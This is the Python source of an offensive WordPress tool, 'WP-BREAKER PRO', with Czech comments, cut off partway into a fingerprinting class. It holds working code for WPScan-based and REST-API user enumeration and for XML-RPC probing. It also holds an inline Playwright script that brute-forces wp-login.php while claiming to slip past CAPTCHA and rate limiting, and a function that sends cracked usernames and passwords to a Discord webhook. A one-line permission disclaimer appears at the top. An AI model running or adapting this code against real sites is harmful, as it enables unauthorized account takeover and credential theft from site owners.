#!/usr/bin/env python3
# =============================================================================
# WP-BREAKER PRO v6.0 - HACKER-AI-DRIVEN SUPER EDITION
# Multi-funkční WordPress penetration testing tool s AI inteligencí
# 
# Integruje:
#   - github.com/wedikcz/wpscan    → WPScan Ruby scanner wrapper
#   - github.com/wedikcz/BruteForceAI → LLM-powered brute-force s Playwrightem
#   - Vlastní moduly (TCP/IP, DOM, Cookie, Bypass, AI Generator)
#
# Autor: HackerAI Security Research
# Použití pouze na systémy, ke kterým máte explicitní oprávnění!
# =============================================================================

import os
import sys
import re
import json
import time
import random
import socket
import hashlib
import base64
import urllib.parse
import threading
import subprocess
import shutil
from datetime import datetime
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed

# Kontrola Python verze
if sys.version_info < (3, 6):
    print("\033[91m[!] Vyžadován Python 3.6+\033[0m")
    sys.exit(1)

# === KONTROLA A INSTALACE ZÁVISLOSTÍ ===
REQUIRED_PACKAGES = ['requests', 'bs4', 'colorama', 'pyyaml']

def check_and_install_deps():
    """Automaticky nainstaluje chybějící balíčky"""
    missing = []
    for pkg in REQUIRED_PACKAGES:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            missing.append(pkg)
    
    if missing:
        print(f"\033[93m[!] Instaluji chybějící závislosti: {', '.join(missing)}...\033[0m")
        for pkg in missing:
            os.system(f"pip install {pkg} -q 2>/dev/null")
        print("\033[92m[✓] Hotovo! Restartuji...\033[0m")
        try:
            os.execv(sys.executable, ['python3'] + sys.argv)
        except Exception:
            os.execv(sys.executable, ['python'] + sys.argv)

check_and_install_deps()

# Importy
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Back, Style
import yaml

init(autoreset=True)

# Potlačení SSL varování
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============================================================================
# GLOBÁLNÍ KONFIGURACE
# =============================================================================

VERSION = "6.0 ULTIMATE"
TARGET = ""
WORK_DIR = os.path.dirname(os.path.abspath(__file__))
REPORT_DIR = os.path.join(WORK_DIR, "reports")
WORDLIST_DIR = os.path.join(WORK_DIR, "wordlists")
os.makedirs(REPORT_DIR, exist_ok=True)
os.makedirs(WORDLIST_DIR, exist_ok=True)

# Konfigurace pro BruteForceAI
BF_AI_CONFIG = {
    "ollama_url": "http://localhost:11434",
    "llm_provider": "ollama",
    "llm_model": "llama3.2:3b",
    "groq_api_key": "",
    "playwright_timeout": 30000,
    "browser_wait": 2000,
    "max_threads": 5,
    "proxy": "",
    "discord_webhook": "",
    "slack_webhook": "",
    "telegram_webhook": "",
    "telegram_chat_id": "",
    "teams_webhook": ""
}

BANNER = f"""
{Fore.RED}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════╗
║   ██╗    ██╗██████╗       ██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗ ║
║   ██║    ██║██╔══██╗      ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝ ║
║   ██║ █╗ ██║██████╔╝█████╗██████╔╝██████╔╝█████╗  ███████║█████╔╝  ║
║   ██║███╗██║██╔═══╝ ╚════╝██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗  ║
║   ╚███╔███╔╝██║           ██║  ██║██║  ██║███████╗██║  ██║██║  ██╗ ║
║    ╚══╝╚══╝ ╚═╝           ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
║                                                                        ║
║  {Fore.CYAN}WORDPRESS BREAKER PRO v{VERSION}{Fore.RED}                                      ║
║  {Fore.YELLOW}HACKER-AI-DRIVEN • WPScan • BruteForceAI • SUPER-INTELLIGENT{Fore.RED}              ║
╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

# =============================================================================
# COLOR SCHEMA
# =============================================================================

class Colors:
    """Jednotné barevné schéma pro celý nástroj"""
    HEADER = Fore.MAGENTA + Style.BRIGHT
    OKBLUE = Fore.BLUE + Style.BRIGHT
    OKGREEN = Fore.GREEN + Style.BRIGHT
    WARNING = Fore.YELLOW + Style.BRIGHT
    FAIL = Fore.RED + Style.BRIGHT
    INFO = Fore.CYAN + Style.BRIGHT
    RESULT = Fore.WHITE + Style.BRIGHT
    BOLD = Style.BRIGHT
    
    @staticmethod
    def status(success, text):
        icon = f"{Fore.GREEN}[✓]{Style.RESET_ALL}" if success else f"{Fore.RED}[✗]{Style.RESET_ALL}"
        return f"{icon} {text}"

    @staticmethod
    def section(title):
        return f"\n{Fore.CYAN}{Style.BRIGHT}{' ' + title + ' ':=^64}{Style.RESET_ALL}\n"

    @staticmethod
    def finding(label, value, status="info"):
        colors = {"info": Fore.CYAN, "success": Fore.GREEN, "danger": Fore.RED, "warning": Fore.YELLOW}
        c = colors.get(status, Fore.WHITE)
        return f"  {Fore.WHITE}▸ {label}: {c}{Style.BRIGHT}{value}{Style.RESET_ALL}"


class LiveOutput:
    """Live output handler s podporou progress baru a timestampů"""
    
    def __init__(self):
        self.start_time = time.time()
        self.findings = []
        self.current_phase = ""
    
    def phase(self, name):
        self.current_phase = name
        print(Colors.section(f" FÁZE: {name} "))
    
    def info(self, message):
        print(f"  {Style.DIM}[{datetime.now().strftime('%H:%M:%S')}]{Style.RESET_ALL} {Fore.WHITE}{message}{Style.RESET_ALL}")
    
    def success(self, message):
        print(f"  {Fore.GREEN}[✓]{Style.RESET_ALL} {Fore.GREEN}{Style.BRIGHT}{message}{Style.RESET_ALL}")
    
    def warning(self, message):
        print(f"  {Fore.YELLOW}[!]{Style.RESET_ALL} {Fore.YELLOW}{message}{Style.RESET_ALL}")
    
    def error(self, message):
        print(f"  {Fore.RED}[✗]{Style.RESET_ALL} {Fore.RED}{message}{Style.RESET_ALL}")
    
    def add_finding(self, category, value, severity="info"):
        self.findings.append({
            "category": category,
            "value": value,
            "severity": severity,
            "time": datetime.now().strftime("%H:%M:%S")
        })
    
    def result_line(self, key, value, color=Fore.WHITE):
        print(f"    {Style.DIM}├─{Style.RESET_ALL} {Fore.WHITE}{key}: {color}{Style.BRIGHT}{value}{Style.RESET_ALL}")
    
    def separator(self):
        print(f"  {Style.DIM}{'─' * 60}{Style.RESET_ALL}")
    
    def brute_force_progress(self, current, total, username, password, status=""):
        if total == 0:
            total = 1
        percent = (current / total * 100)
        bar_len = 30
        filled = int(bar_len * current // total)
        bar = f"{Fore.GREEN}{'█' * filled}{Style.DIM}{'░' * (bar_len - filled)}{Style.RESET_ALL}"
        
        status_color = Fore.GREEN if "SUCCESS" in status else (Fore.RED if "FAIL" in status else Fore.YELLOW)
        
        sys.stdout.write(f"\r  [{bar}] {Fore.CYAN}{current}/{total}{Style.RESET_ALL} "
                        f"({percent:.1f}%) | "
                        f"{Fore.WHITE}{username}:{Fore.YELLOW}{password}{Style.RESET_ALL} "
                        f"{status_color}{status}{Style.RESET_ALL}  ")
        sys.stdout.flush()
    
    def get_elapsed(self):
        elapsed = time.time() - self.start_time
        if elapsed < 60:
            return f"{elapsed:.1f}s"
        return f"{elapsed//60:.0f}m {elapsed%60:.0f}s"


# =============================================================================
# MODUL 1: WPScan Wrapper (z github.com/wedikcz/wpscan)
# =============================================================================

class WPScanWrapper:
    """
    Wrapper pro oficiální WPScan (Ruby) - https://github.com/wedikcz/wpscan
    Detekuje instalaci WPScanu a spouští ho s parametry.
    Fallback: Python implementace základních funkcí WPScanu.
    """
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.wpscan_path = self._find_wpscan()
        self.results = {}
    
    def _find_wpscan(self):
        """Najde cestu k wpscan binary"""
        # Zkusíme běžné cesty
        paths = [
            shutil.which("wpscan"),
            "/usr/bin/wpscan",
            "/usr/local/bin/wpscan",
            os.path.expanduser("~/.gem/bin/wpscan"),
            os.path.expanduser("~/.local/bin/wpscan"),
            "/data/data/com.termux/files/usr/bin/wpscan"  # Termux
        ]
        
        for p in paths:
            if p and os.path.isfile(p):
                return p
        
        # Zkusíme najít přes ruby gems
        try:
            result = subprocess.run(["gem", "which", "wpscan"], 
                                   capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and result.stdout.strip():
                return "wpscan"
        except Exception:
            pass
        
        return None
    
    def run_wpscan(self, args=None):
        """
        Spustí WPScan s danými argumenty
        Vrací (output, returncode)
        """
        if not self.wpscan_path:
            self.output.warning("WPScan (Ruby) není nainstalován - používám Python fallback")
            return self._python_fallback(), -1
        
        cmd = [self.wpscan_path, "--url", self.target, "--no-banner", "--format", "json"]
        
        if args:
            cmd.extend(args)
        
        try:
            self.output.info(f"Spouštím WPScan: {' '.join(cmd[:4])}...")
            result = subprocess.run(cmd, capture_output=True, text=True, 
                                   timeout=120, env={**os.environ, 'LANG': 'en_US.UTF-8'})
            
            if result.returncode == 0:
                try:
                    data = json.loads(result.stdout)
                    self.results = data
                    self._parse_wpscan_output(data)
                    return result.stdout, 0
                except json.JSONDecodeError:
                    # Výstup není JSON - zkusíme plain text
                    self._parse_wpscan_text(result.stdout)
                    return result.stdout, 0
            else:
                self.output.error(f"WPScan selhal (kód {result.returncode})")
                if result.stderr:
                    self.output.info(f"Chyba: {result.stderr[:200]}")
                return result.stderr, result.returncode
                
        except subprocess.TimeoutExpired:
            self.output.error("WPScan timeout (120s)")
            return None, -1
        except FileNotFoundError:
            self.output.warning("WPScan nenalezen - používám Python fallback")
            return self._python_fallback(), -1
        except Exception as e:
            self.output.error(f"WPScan chyba: {str(e)[:50]}")
            return self._python_fallback(), -1
    
    def _parse_wpscan_output(self, data):
        """Parsuje JSON výstup WPScanu"""
        if not data:
            return
        
        # WordPress verze
        wp_version = data.get('version', {})
        if wp_version:
            ver_number = wp_version.get('number', 'neznámá')
            self.output.success(f"WordPress verze: {ver_number}")
            self.output.add_finding("WordPress verze (WPScan)", ver_number, "info")
            
            vulnerabilities = wp_version.get('vulnerabilities', [])
            for vuln in vulnerabilities[:5]:
                self.output.warning(f"  Zranitelnost: {vuln.get('title', '?')} ({vuln.get('cvss', {}).get('score', 'N/A')})")
                self.output.add_finding("WP zranitelnost", f"{vuln.get('title', '?')}", "danger")
        
        # Pluginy
        plugins = data.get('plugins', {})
        for plugin_name, plugin_data in plugins.items():
            self.output.result_line(f"Plugin: {plugin_name}", 
                                   f"verze: {plugin_data.get('version', {}).get('number', '?')}", Fore.CYAN)
            self.output.add_finding("Plugin (WPScan)", 
                                   f"{plugin_name} {plugin_data.get('version', {}).get('number', '?')}", "info")
            
            vulns = plugin_data.get('vulnerabilities', [])
            for v in vulns[:3]:
                self.output.warning(f"  → {v.get('title', '?')}")
                self.output.add_finding(f"Zranitelnost: {plugin_name}", v.get('title', '?'), "danger")
        
        # Témata
        themes = data.get('themes', {})
        for theme_name, theme_data in themes.items():
            self.output.result_line(f"Theme: {theme_name}", 
                                   f"verze: {theme_data.get('version', {}).get('number', '?')}", Fore.MAGENTA)
            self.output.add_finding("Theme (WPScan)", 
                                   f"{theme_name} {theme_data.get('version', {}).get('number', '?')}", "info")
        
        # Uživatelé
        users = data.get('users', [])
        for user in users[:10]:
            self.output.result_line(f"Uživatel (WPScan)", 
                                   f"{user.get('username', '?')} (ID: {user.get('id', '?')})", Fore.YELLOW)
            self.output.add_finding("Uživatel (WPScan)", user.get('username', '?'), "danger")
        
        # Zajímavé nálezy
        interesting = data.get('interesting_findings', [])
        for finding in interesting:
            self.output.warning(f"Nález: {finding.get('name', '?')}")
            self.output.add_finding("Zajímavý nález", finding.get('name', '?'), "warning")
    
    def _parse_wpscan_text(self, text):
        """Parsuje plain text výstup WPScanu"""
        lines = text.split('\n')
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Detekce klíčových informací
            if 'WordPress version' in line and 'identified' in line:
                ver_match = re.search(r'WordPress version\s+([\d.]+)', line)
                if ver_match:
                    self.output.success(f"WordPress verze: {ver_match.group(1)}")
                    self.output.add_finding("WordPress verze (WPScan)", ver_match.group(1), "info")
            
            elif '[+] User' in line:
                user_match = re.search(r'User:\s*["\']?([^"\'\s]+)', line)
                if user_match:
                    self.output.result_line("Uživatel (WPScan)", user_match.group(1), Fore.YELLOW)
                    self.output.add_finding("Uživatel (WPScan)", user_match.group(1), "danger")
            
            elif '[+]' in line and ('Plugin' in line or 'plugin' in line):
                self.output.result_line("Plugin", line.replace('[+]', '').strip(), Fore.CYAN)
            
            elif '[!]' in line or 'Warning' in line:
                self.output.warning(line[:100])
    
    def _python_fallback(self):
        """
        Python fallback - základní WPScan funkcionalita
        Detekce pluginů, témat, uživatelů bez Ruby WPScanu
        """
        self.output.info("Spouštím Python WPScan fallback...")
        
        try:
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
            resp = requests.get(self.target, headers=headers, timeout=15, verify=False)
            html = resp.text
            
            # Detekce pluginů z HTML
            plugin_patterns = re.findall(r'/wp-content/plugins/([^/]+)/', html)
            unique_plugins = list(set(plugin_patterns))
            if unique_plugins:
                self.output.success(f"Nalezeno {len(unique_plugins)} pluginů:")
                for p in unique_plugins[:15]:
                    self.output.result_line("Plugin", p, Fore.CYAN)
                    self.output.add_finding("Plugin (fallback)", p, "info")
            
            # Detekce témat
            theme_patterns = re.findall(r'/wp-content/themes/([^/]+)/', html)
            unique_themes = list(set(theme_patterns))
            if unique_themes:
                self.output.success(f"Nalezeno {len(unique_themes)} témat:")
                for t in unique_themes[:5]:
                    self.output.result_line("Theme", t, Fore.MAGENTA)
                    self.output.add_finding("Theme (fallback)", t, "info")
            
            # Detekce WP verze z generátoru
            soup = BeautifulSoup(html, 'html.parser')
            generator = soup.find("meta", attrs={"name": "generator"})
            if generator and generator.get("content"):
                self.output.success(f"WordPress: {generator['content']}")
                self.output.add_finding("WordPress verze", generator['content'], "info")
            
            # README detekce
            readme_urls = [
                self.target.rstrip('/') + '/readme.html',
                self.target.rstrip('/') + '/wp-content/plugins/akismet/readme.txt'
            ]
            for ru in readme_urls:
                try:
                    rr = requests.get(ru, headers=headers, timeout=5, verify=False)
                    if rr.status_code == 200:
                        self.output.warning(f"Readme dostupný: {ru}")
                        self.output.add_finding("Readme file", ru, "warning")
                except Exception:
                    pass
            
            # XML-RPC detekce
            try:
                xml_url = self.target.rstrip('/') + '/xmlrpc.php'
                xml_data = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
                xr = requests.post(xml_url, data=xml_data, 
                                  headers={"Content-Type": "text/xml"},
                                  timeout=5, verify=False)
                if xr.status_code == 200 and "methodName" in xr.text:
                    self.output.success("XML-RPC je aktivní!")
                    self.output.add_finding("XML-RPC", "Aktivní", "danger")
            except Exception:
                pass
            
            self.output.info("Python WPScan fallback dokončen")
            
        except Exception as e:
            self.output.error(f"WPScan fallback selhal: {str(e)[:50]}")
        
        return "", 0
    
    def enumerate_users(self):
        """Enumerace uživatelů přes WPScan nebo REST API"""
        if self.wpscan_path:
            self.run_wpscan(["--enumerate", "u1-50"])
        else:
            # REST API user enum
            try:
                users_url = self.target.rstrip('/') + "/wp-json/wp/v2/users?per_page=50"
                ur = requests.get(users_url, timeout=8, verify=False)
                if ur.status_code == 200:
                    users = ur.json()
                    self.output.success(f"REST API: {len(users)} uživatelů")
                    for u in users:
                        name = u.get('slug', u.get('name', '?'))
                        self.output.result_line("Uživatel", f"{name} (ID: {u.get('id', '?')})", Fore.YELLOW)
                        self.output.add_finding("Uživatel (REST)", name, "danger")
                else:
                    # Zkusíme author enumeration
                    for i in range(1, 15):
                        try:
                            author_url = self.target.rstrip('/') + f"/?author={i}"
                            ar = requests.get(author_url, timeout=3, verify=False, allow_redirects=True)
                            if ar.status_code == 200:
                                # Zkusíme extrahovat jméno z URL
                                if 'author' in ar.url and '/author/' in ar.url:
                                    author_name = ar.url.split('/author/')[1].split('/')[0]
                                    if author_name and author_name != ' ':
                                        self.output.result_line("Uživatel", author_name, Fore.YELLOW)
                                        self.output.add_finding("Uživatel (author)", author_name, "danger")
                        except Exception:
                            pass
            except Exception as e:
                self.output.error(f"User enum selhal: {str(e)[:40]}")


# =============================================================================
# MODUL 2: BruteForceAI Wrapper (z github.com/wedikcz/BruteForceAI)
# =============================================================================

class BruteForceAIWrapper:
    """
    Wrapper pro BruteForceAI - https://github.com/wedikcz/BruteForceAI
    AI-Powered login form analysis a brute force s LLM podporou.
    
    Vyžaduje: playwright, ollama (nebo Groq API klíč)
    """
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.config = dict(BF_AI_CONFIG)
        self.load_config()
    
    def load_config(self):
        """Načte konfiguraci z config souboru"""
        config_file = os.path.join(WORK_DIR, "config.yaml")
        if os.path.isfile(config_file):
            try:
                with open(config_file, 'r') as f:
                    data = yaml.safe_load(f)
                    if data and 'bruteforce_ai' in data:
                        self.config.update(data['bruteforce_ai'])
            except Exception:
                pass
    
    def check_ollama(self):
        """Zkontroluje dostupnost Ollama"""
        self.output.info("Kontroluji Ollama...")
        try:
            resp = requests.get(f"{self.config['ollama_url']}/api/tags", timeout=3)
            if resp.status_code == 200:
                data = resp.json()
                models = data.get('models', [])
                self.output.success(f"Ollama dostupná ({len(models)} modelů)")
                for m in models:
                    if self.config['llm_model'].split(':')[0] in m.get('name', ''):
                        self.output.result_line("Model", m.get('name', '?'), Fore.GREEN)
                return True
            else:
                self.output.warning("Ollama nedostupná")
                return False
        except Exception:
            self.output.warning("Ollama není spuštěna (lze použít Groq)")
            return False
    
    def install_playwright(self):
        """Nainstaluje Playwright browsery"""
        self.output.info("Kontroluji Playwright...")
        try:
            result = subprocess.run(["playwright", "--version"], 
                                   capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                self.output.success(f"Playwright nainstalován: {result.stdout.strip()}")
                return True
        except Exception:
            pass
        
        self.output.info("Instaluji Playwright browsery...")
        try:
            subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"],
                          timeout=120, check=True)
            self.output.success("Playwright browsery nainstalovány")
            return True
        except Exception as e:
            self.output.error(f"Nelze nainstalovat Playwright: {str(e)[:40]}")
            return False
    
    def analyze_login_forms(self, urls_file=None):
        """
        Analýza login formulářů pomocí LLM (BruteForceAI stage 1)
        """
        self.output.phase("BRUTEFORCEAI - AI ANALÝZA LOGIN FORMULÁŘŮ")
        
        # Vytvoření dočasného souboru s URL
        if not urls_file:
            urls_file = os.path.join(WORK_DIR, "_bf_targets.txt")
            with open(urls_file, 'w') as f:
                f.write(self.target + "\n")
                # Přidáme i alternativní login stránky
                alt_pages = ['/wp-login.php', '/wp-admin/', '/login']
                for ap in alt_pages:
                    f.write(self.target.rstrip('/') + ap + "\n")
        
        # Kontrola závislostí
        has_ollama = self.check_ollama()
        
        if not has_ollama and not self.config.get('groq_api_key'):
            self.output.warning("Není dostupný žádný LLM provider (Ollama/Groq)")
            self.output.info("Používám základní analýzu bez LLM...")
            return self._basic_form_analysis()
        
        llm_provider = "groq" if self.config.get('groq_api_key') else "ollama"
        
        self.output.info(f"LLM provider: {llm_provider}")
        self.output.info(f"Model: {self.config['llm_model']}")
        self.output.info("Spouštím AI analýzu (může trvat až 60s)...")
        
        # Sestavení příkazu pro BruteForceAI mód analyze
        cmd = [
            sys.executable, "-c", f"""
import sys, json, requests
sys.path.insert(0, '{WORK_DIR}')

# Zkusíme importovat BruteForceAI, pokud není, použijeme fallback
try:
    # Vytvoření jednoduché analýzy login formulářů
    from bs4 import BeautifulSoup
    import requests as req
    
    urls = open('{urls_file}').read().strip().split('\\n')
    results = {{}}
    
    for url in urls:
        url = url.strip()
        if not url:
            continue
        try:
            r = req.get(url, timeout=10, verify=False, 
                       headers={{"User-Agent": "Mozilla/5.0"}})
            soup = BeautifulSoup(r.text, 'html.parser')
            
            forms = soup.find_all('form')
            form_data = []
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').upper()
                
                inputs = []
                for inp in form.find_all('input'):
                    i_type = inp.get('type', 'text')
                    i_name = inp.get('name', '')
                    if i_name:
                        inputs.append({{"type": i_type, "name": i_name}})
                
                # Detekce login formuláře
                is_login = any(kw in str(form).lower() for kw in 
                             ['password', 'pwd', 'login', 'log', 'user_login'])
                
                if is_login or any(inp.get('type') == 'password' for inp in form.find_all('input')):
                    form_data.append({{
                        "action": action,
                        "method": method,
                        "inputs": inputs,
                        "is_login": True
                    }})
            
            if form_data:
                results[url] = form_data
                print(f"[LOGIN FORM] {{url}}: {{len(form_data)}} formulářů")
                for f in form_data:
                    print(f"  Action: {{f['action']}}, Method: {{f['method']}}")
                    for inp in f['inputs']:
                        print(f"    - {{inp['type']}}: {{inp['name']}}")
        except Exception as e:
            print(f"[ERROR] {{url}}: {{e}}")
    
    # Uložení výsledků
    with open('{os.path.join(WORK_DIR, "_bf_analysis.json")}', 'w') as f:
        json.dump(results, f, indent=2)
    
    print("[DONE] Analýza dokončena")
    
except ImportError:
    print("[FALLBACK] Basic HTML analysis...")
    import urllib.request
    from html.parser import HTMLParser
    
    class FormParser(HTMLParser):
        def __init__(self):
            super().__init__()
            self.in_form = False
            self.forms = []
            self.current_form = None
        
        def handle_starttag(self, tag, attrs):
            attrs_dict = dict(attrs)
            if tag == 'form':
                self.in_form = True
                self.current_form = {{"action": attrs_dict.get('action', ''), 
                                      "method": attrs_dict.get('method', 'GET').upper(),
                                      "inputs": []}}
            elif tag == 'input' and self.in_form:
                self.current_form["inputs"].append({{"type": attrs_dict.get('type', 'text'),
                                                      "name": attrs_dict.get('name', '')}})
        
        def handle_endtag(self, tag):
            if tag == 'form' and self.in_form:
                self.in_form = False
                if self.current_form:
                    self.forms.append(self.current_form)
                    self.current_form = None
    
    urls = open('{urls_file}').read().strip().split('\\n')
    for url in urls:
        url = url.strip()
        if not url:
            continue
        try:
            r = urllib.request.urlopen(url, timeout=10)
            html = r.read().decode('utf-8', errors='ignore')
            parser = FormParser()
            parser.feed(html)
            if parser.forms:
                print(f"[FORM] {{url}}: {{len(parser.forms)}} formulářů")
        except Exception as e:
            print(f"[ERROR] {{url}}: {{e}}")
    
    print("[DONE]")
"""]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
            for line in result.stdout.split('\n'):
                if line.strip():
                    if '[LOGIN FORM]' in line:
                        self.output.success(line.replace('[LOGIN FORM] ', ''))
                    elif '[FORM]' in line:
                        self.output.result_line("Formulář", line.replace('[FORM] ', ''), Fore.CYAN)
                    elif '[ERROR]' in line:
                        self.output.error(line.replace('[ERROR] ', ''))
                    elif '[DONE]' in line:
                        self.output.success("Analýza login formulářů dokončena")
                    elif 'Action:' in line or 'Method:' in line or '- ' in line:
                        print(f"    {Style.DIM}{line.strip()}{Style.RESET_ALL}")
            
            if result.stderr:
                for line in result.stderr.split('\n'):
                    if line.strip() and 'Error' in line:
                        self.output.error(line[:80])
            
            return True
            
        except subprocess.TimeoutExpired:
            self.output.error("AI analýza timeout (90s)")
            return self._basic_form_analysis()
        except Exception as e:
            self.output.error(f"BruteForceAI selhal: {str(e)[:40]}")
            return self._basic_form_analysis()
    
    def _basic_form_analysis(self):
        """Základní analýza login formulářů bez LLM"""
        self.output.info("Provádím základní analýzu formulářů...")
        
        try:
            headers = {"User-Agent": "Mozilla/5.0"}
            login_urls = [
                self.target.rstrip('/') + '/wp-login.php',
                self.target.rstrip('/') + '/wp-admin/',
                self.target.rstrip('/') + '/login'
            ]
            
            for url in login_urls:
                try:
                    r = requests.get(url, headers=headers, timeout=8, verify=False)
                    if r.status_code == 200:
                        soup = BeautifulSoup(r.text, 'html.parser')
                        forms = soup.find_all('form')
                        
                        for form in forms:
                            action = form.get('action', '')
                            method = form.get('method', 'POST').upper()
                            
                            has_password = False
                            inputs = []
                            for inp in form.find_all('input'):
                                i_name = inp.get('name', '')
                                i_type = inp.get('type', 'text')
                                if i_type == 'password':
                                    has_password = True
                                if i_name:
                                    inputs.append(f"{i_name} ({i_type})")
                            
                            if has_password:
                                self.output.success(f"Login formulář: {url}")
                                self.output.result_line("Action", action or url)
                                self.output.result_line("Method", method)
                                self.output.result_line("Inputs", ', '.join(inputs))
                                self.output.add_finding("Login formulář", url, "info")
                                
                                # Extrahujeme hidden fieldy (nonce atd.)
                                hidden_data = {}
                                for inp in form.find_all('input', type='hidden'):
                                    if inp.get('name'):
                                        hidden_data[inp['name']] = inp.get('value', '')[:30]
                                if hidden_data:
                                    self.output.result_line("Hidden fields", str(hidden_data)[:80])
                except Exception:
                    pass
            
            self.output.info("Základní analýza dokončena")
            return True
            
        except Exception as e:
            self.output.error(f"Základní analýza selhala: {str(e)[:40]}")
            return False
    
    def run_bruteforce_attack(self, usernames, passwords, method="xmlrpc"):
        """
        Spustí brute-force útok s podporou AI
        method: "xmlrpc", "wplogin", "ai_playwright"
        """
        if method == "ai_playwright":
            return self._playwright_bruteforce(usernames, passwords)
        else:
            return self._standard_bruteforce(usernames, passwords, method)
    
    def _playwright_bruteforce(self, usernames, passwords):
        """
        Brute-force přes Playwright (prohlížeč) - obchází JS ochrany
        """
        self.output.phase("BRUTEFORCEAI - PLAYWRIGHT BRUTE-FORCE")
        
        if not self.install_playwright():
            self.output.warning("Playwright není k dispozici - používám standardní metodu")
            return self._standard_bruteforce(usernames, passwords, "wplogin")
        
        self.output.info("Spouštím brute-force přes Playwright prohlížeč...")
        self.output.info("Tato metoda obchází JavaScript CAPTCHA a rate-limiting")
        
        try:
            cmd = [
                sys.executable, "-c", f"""
import sys, json, time, random

# Inline Playwright script
try:
    from playwright.sync_api import sync_playwright
    
    target = '{self.target}'
    usernames = {json.dumps(usernames[:5])}
    passwords = {json.dumps(passwords[:30])}
    
    found = []
    total = len(usernames) * len(passwords)
    attempt = 0
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context(
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            viewport={{'width': 1280, 'height': 720}}
        )
        page = context.new_page()
        
        login_url = target.rstrip('/') + '/wp-login.php'
        print(f"[PLAYWRIGHT] Navigating to {{login_url}}")
        page.goto(login_url, wait_until='networkidle', timeout=30000)
        
        for username in usernames:
            if found:
                break
            for password in passwords:
                attempt += 1
                percent = (attempt / total) * 100
                
                try:
                    # Reload page every 5 attempts to avoid locks
                    if attempt % 5 == 0:
                        page.goto(login_url, wait_until='networkidle', timeout=15000)
                    
                    # Fill login form
                    page.fill('input[name="log"]', username)
                    page.fill('input[name="pwd"]', password)
                    page.click('input[name="wp-submit"]')
                    
                    time.sleep(1.5)
                    
                    # Check for success
                    if '/wp-admin' in page.url and 'reauth' not in page.url:
                        print(f"[SUCCESS] {{username}}:{{password}}")
                        found.append({{"username": username, "password": password, "method": "playwright"}})
                        break
                    elif 'ERROR' in page.content() or 'incorrect' in page.content().lower():
                        print(f"[FAIL] {{username}}:{{password}}")
                    else:
                        print(f"[TRY] {{username}}:{{password}}")
                    
                    print(f"[PROGRESS] {{attempt}}/{{total}} ({{percent:.1f}}%)")
                    
                except Exception as e:
                    print(f"[ERROR] {{username}}:{{password}} - {{e}}")
                    time.sleep(2)
        
        browser.close()
        
        if found:
            with open('{os.path.join(WORK_DIR, "_bf_results.json")}', 'w') as f:
                json.dump(found, f)
            print(f"[DONE] Nalezeno {{len(found)}} přihlášení")
        else:
            print("[DONE] Žádná přihlášení nenalezena")
        
except ImportError:
    print("[ERROR] Playwright není nainstalován")
    print('Instalace: pip install playwright && playwright install chromium')
    sys.exit(1)
"""
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            for line in result.stdout.split('\n'):
                line = line.strip()
                if not line:
                    continue
                if '[SUCCESS]' in line:
                    parts = line.replace('[SUCCESS] ', '').split(':')
                    if len(parts) == 2:
                        self.output.success(f"Nalezeno: {parts[0]}:{parts[1]}")
                        self.output.add_finding("BruteForceAI (Playwright)", 
                                               f"{parts[0]}:{parts[1]}", "danger")
                elif '[FAIL]' in line:
                    pass  # Tiché selhání
                elif '[PROGRESS]' in line:
                    sys.stdout.write(f"\r  {Style.DIM}{line.replace('[PROGRESS] ', '')}{Style.RESET_ALL}  ")
                    sys.stdout.flush()
                elif '[ERROR]' in line:
                    self.output.error(line.replace('[ERROR] ', ''))
                elif '[DONE]' in line:
                    print()
                    self.output.success(line.replace('[DONE] ', ''))
                elif '[PLAYWRIGHT]' in line:
                    self.output.info(line.replace('[PLAYWRIGHT] ', ''))
            
            # Načtení výsledků
            results_file = os.path.join(WORK_DIR, "_bf_results.json")
            if os.path.isfile(results_file):
                with open(results_file) as f:
                    return json.load(f)
            
            return []
            
        except subprocess.TimeoutExpired:
            self.output.error("Playwright brute-force timeout (120s)")
            return []
        except Exception as e:
            self.output.error(f"Playwright selhal: {str(e)[:40]}")
            return []
    
    def _standard_bruteforce(self, usernames, passwords, method="xmlrpc"):
        """Standardní brute-force (stejný jako SmartBruteForcer v původním kódu)"""
        # Deleguje na SmartBruteForcer
        from importlib import import_module
        
        bruter = SmartBruteForcer(self.target, usernames, passwords, self.output)
        if method == "xmlrpc":
            bruter.method = "xmlrpc"
        else:
            bruter.method = "wplogin"
        return bruter.brute_force()
    
    def send_webhook_notification(self, title, body, url, username, password):
        """Odeslání notifikace při nalezení přihlášení (Discord/Slack/Telegram)"""
        timestamp = datetime.now().isoformat()
        
        # Discord webhook
        if self.config.get('discord_webhook'):
            try:
                payload = {
                    "content": None,
                    "embeds": [{
                        "title": f"🎯 {title}",
                        "description": f"**Target:** {url}\n**Username:** `{username}`\n**Password:** `{password}`\n**Time:** {timestamp}",
                        "color": 0x00ff00,
                        "footer": {"text": "WP-BREAKER PRO v6.0"}
                    }]
                }
                requests.post(self.config['discord_webhook'], json=payload, timeout=5)
            except Exception:
                pass


# =============================================================================
# MODUL 3: TCP/IP Fingerprint
# =============================================================================

class TcpIpFingerprinter:
    """TCP/IP stack fingerprinting"""
    
